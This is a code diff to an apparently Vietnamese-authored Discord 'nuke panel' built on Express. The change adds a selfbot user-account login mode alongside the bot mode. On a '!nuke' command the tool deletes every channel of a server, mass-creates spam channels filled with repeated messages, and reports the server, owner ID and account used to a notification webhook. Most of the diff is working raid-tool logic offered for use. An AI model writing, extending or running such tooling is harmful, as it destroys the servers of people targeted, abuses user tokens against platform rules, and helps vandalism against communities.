@@ -1,5 +1,6 @@
 import express from 'express';
-import { Client, GatewayIntentBits, ChannelType } from 'discord.js';
+import { Client as BotClient, GatewayIntentBits as BotIntents, ChannelType as BotChannelType } from 'discord.js';
+import { Client as UserClient } from 'discord.js-selfbot-v13';
 import path from 'path';
 import { fileURLToPath } from 'url';
 
@@ -19,8 +20,8 @@ const CONFIG = {
   pingEveryone: true
 };
 
-let botClient = null;
-let currentToken = null;
+let client = null;
+let clientMode = 'bot';
 let currentClientId = null;
 let webLogs = [];
 
@@ -33,70 +34,85 @@ function pushLog(msg, type = 'info') {
 
 async function notifyNuke(info) {
   const { guildName, guildIcon, guildId, ownerId, channels, msgs, user, error } = info;
+  
+  const fields = [
+    { name: 'Server', value: guildName || 'không rõ', inline: true },
+    { name: 'Guild ID', value: guildId || '-', inline: true },
+    { name: 'Kênh tạo', value: String(channels ?? 0), inline: true },
+    { name: 'Tin nhắn', value: String(msgs ?? 0), inline: true },
+    { name: 'Người dùng', value: user || '-', inline: true },
+    { name: 'Owner ID', value: ownerId || '-', inline: true },
+    { name: 'Thời gian', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false },
+  ];
+
+  if (guildId) fields.push({ name: 'Link server', value: `https://discord.com/channels/${guildId}`, inline: false });
+  if (error) fields.push({ name: 'Lỗi', value: String(error).slice(0, 1000), inline: false });
+
   const embed = {
     title: error ? 'Nuke thất bại' : 'Nuke thành công',
     color: error ? 0xff0000 : 0x00ff66,
-    fields: [
-      { name: 'Server', value: guildName || 'không rõ', inline: true },
-      { name: 'Guild ID', value: guildId || '-', inline: true },
-      { name: 'Kênh tạo', value: String(channels ?? 0), inline: true },
-      { name: 'Tin nhắn', value: String(msgs ?? 0), inline: true },
-      { name: 'Người dùng', value: user || '-', inline: true },
-      { name: 'Owner ID', value: ownerId || '-', inline: true },
-      { name: 'Thời gian', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false },
-    ],
+    fields,
     thumbnail: guildIcon ? { url: guildIcon } : undefined,
     footer: { text: 'nuke panel | by PhTuanKhanh' },
     timestamp: new Date().toISOString(),
   };
-  if (guildId) embed.fields.push({ name: 'Link server', value: `https://discord.com/channels/${guildId}`, inline: false });
-  if (error) embed.fields.push({ name: 'Lỗi', value: String(error).slice(0, 1000), inline: false });
   
   const body = { username: 'nuke notifier', avatar_url: guildIcon || null, embeds: [embed] };
   
   try {
-    await fetch(NOTIFY_WEBHOOK + '?wait=false', {
+    const res = await fetch(NOTIFY_WEBHOOK + '?wait=true', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(body),
     });
+
+    if (!res.ok) {
+      const errText = await res.text();
+      pushLog(`Webhook lỗi (${res.status}): ${errText}`, 'error');
+    } else {
+      pushLog(`Gửi webhook thành công!`, 'success');
+    }
   } catch (e) {
-    pushLog(`Webhook error: ${e.message}`, 'error');
+    pushLog(`Webhook crash: ${e.message}`, 'error');
   }
 }
 
-function startBot(token) {
-  if (botClient) {
-    botClient.destroy();
-    botClient = null;
+function startClient(token, mode) {
+  if (client) {
+    client.destroy();
+    client = null;
     currentClientId = null;
   }
 
-  currentToken = token;
-  botClient = new Client({
-    intents: [
-      GatewayIntentBits.Guilds,
-      GatewayIntentBits.GuildMessages,
-      GatewayIntentBits.MessageContent,
-      GatewayIntentBits.GuildMembers
-    ]
+  clientMode = mode;
+
+  if (mode === 'user') {
+    client = new UserClient({ checkUpdate: false });
+  } else {
+    client = new BotClient({
+      intents: [
+        BotIntents.Guilds,
+        BotIntents.GuildMessages,
+        BotIntents.MessageContent,
+        BotIntents.GuildMembers
+      ]
+    });
+  }
+
+  client.on('ready', () => {
+    currentClientId = client.user.id;
+    pushLog(`[${mode.toUpperCase()}] Đã online: ${client.user.tag}`, 'success');
   });
 
-  botClient.on('ready', () => {
-    currentClientId = botClient.user.id;
-    pushLog(`Bot đã online: ${botClient.user.tag}`, 'success');
-  });
-
-  botClient.on('messageCreate', async (message) => {
+  client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
+    if (mode === 'user' && message.author.id === client.user.id) return;
     if (message.content !== '!nuke') return;
 
     const guild = message.guild;
     const t0 = Date.now();
-    
-    // Gửi reply nếu kênh còn
     message.reply('🚀 Bắt đầu nuke...').catch(() => {});
-    pushLog(`Bắt đầu nuke server: ${guild.name}`, 'warn');
+    pushLog(`[${mode.toUpperCase()}] Bắt đầu nuke server: ${guild.name}`, 'warn');
 
     let channelsCreated = 0;
     let msgsSent = 0;
@@ -116,10 +132,9 @@ function startBot(token) {
         guildIcon: guild.iconURL({ size: 256, extension: 'png' }),
         guildId: guild.id, ownerId: guild.ownerId,
         channels: cc, msgs: cc * mc,
-        user: botClient.user.username,
+        user: client.user.username,
         error: null,
       });
-      pushLog('Đã gửi webhook thông báo.', 'success');
 
       // 3. XOÁ ALL KÊNH
       pushLog(`Đang xoá toàn bộ kênh...`, 'info');
@@ -135,7 +150,7 @@ function startBot(token) {
       const createPromises = Array.from({ length: cc }, () =>
         guild.channels.create({
           name: chName,
-          type: ChannelType.GuildText,
+          type: mode === 'user' ? 0 : BotChannelType.GuildText,
         }).then(async c => {
           channelsCreated++;
           for (let i = 0; i < mc; i++) {
@@ -150,8 +165,6 @@ function startBot(token) {
       await Promise.allSettled(createPromises);
 
       pushLog(`NUKE HOÀN TẤT trong ${Date.now() - t0}ms!`, 'success');
-      
-      // Đợi 2s để Discord.js cập nhật lại cache kênh mới, tránh kẹt lệnh
       await new Promise(r => setTimeout(r, 2000));
 
     } catch (err) {
@@ -159,55 +172,53 @@ function startBot(token) {
     }
   });
 
-  botClient.login(token).catch(e => {
+  client.login(token).catch(e => {
     pushLog(`Lỗi đăng nhập: ${e.message}`, 'error');
-    botClient = null;
+    client = null;
     currentClientId = null;
   });
 }
 
-// --- API ROUTES ---
 app.post('/api/login', async (req, res) => {
-  const { token } = req.body ?? {};
+  const { token, mode } = req.body ?? {};
   
   if (!token || typeof token !== 'string') return res.status(400).json({ error: 'Thiếu token' });
 
   const cleanToken = token.trim();
   if (!/^[A-Za-z0-9._-]+$/.test(cleanToken)) return res.status(400).json({ error: 'Token không hợp lệ' });
 
-  pushLog('Đang kết nối bot...', 'info');
-  startBot(cleanToken);
+  pushLog(`Đang kết nối [${mode || 'bot'}]...`, 'info');
+  startClient(cleanToken, mode || 'bot');
   
-  await new Promise(r => setTimeout(r, 2000));
+  await new Promise(r => setTimeout(r, 2500));
   
-  if (botClient && botClient.user) {
+  if (client && client.user) {
     res.json({ 
       ok: true, 
-      user: botClient.user.tag,
-      clientId: botClient.user.id
+      user: client.user.tag,
+      clientId: client.user.id
     });
   } else {
-    res.status(500).json({ error: 'Đăng nhập thất bại, kiểm tra token' });
+    res.status(500).json({ error: 'Đăng nhập thất bại. Kiểm tra lại token.' });
   }
 });
 
 app.post('/api/logout', (req, res) => {
-  if (botClient) {
-    // Ép ngắt kết nối WebSocket, xoá token
-    botClient.destroy();
-    botClient = null;
-    currentToken = null;
+  if (client) {
+    client.destroy();
+    client = null;
     currentClientId = null;
-    pushLog('Bot đã tắt hoàn toàn.', 'warn');
+    pushLog('Đã tắt kết nối hoàn toàn.', 'warn');
   }
   res.json({ ok: true });
 });
 
 app.get('/api/status', (req, res) => {
   res.json({
-    online: !!(botClient && botClient.user),
-    user: botClient?.user?.tag || null,
-    clientId: currentClientId
+    online: !!(client && client.user),
+    user: client?.user?.tag || null,
+    clientId: currentClientId,
+    mode: clientMode
   });
 });
 
